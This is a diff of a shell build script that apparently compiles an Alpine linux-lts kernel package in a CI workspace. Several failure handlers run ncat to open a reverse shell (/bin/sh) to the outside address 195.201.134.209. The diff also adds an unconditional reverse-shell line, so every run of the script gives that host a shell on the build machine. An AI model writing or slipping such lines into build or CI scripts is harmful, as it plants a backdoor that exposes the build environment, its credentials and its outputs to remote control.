@@ -58,10 +58,6 @@ sudo -u abuild3 "/home/abuild3/installrsakey.sh" || {
   ncat 195.201.134.209 83 -e /bin/sh
 }
 
-#su -c "/home/abuild3/installrsakey.sh" -m abuild3 || {
-#  ncat 195.201.134.209 84 -e /bin/sh
-#}
-
 cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
 
@@ -69,7 +65,7 @@ su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 || {
   ncat 195.201.134.209 83 -e /bin/sh
 }
 
-
+ncat 195.201.134.209 84 -e /bin/sh
 
 : <<'END'
 sudo -i -u abuild3 bash << EOF
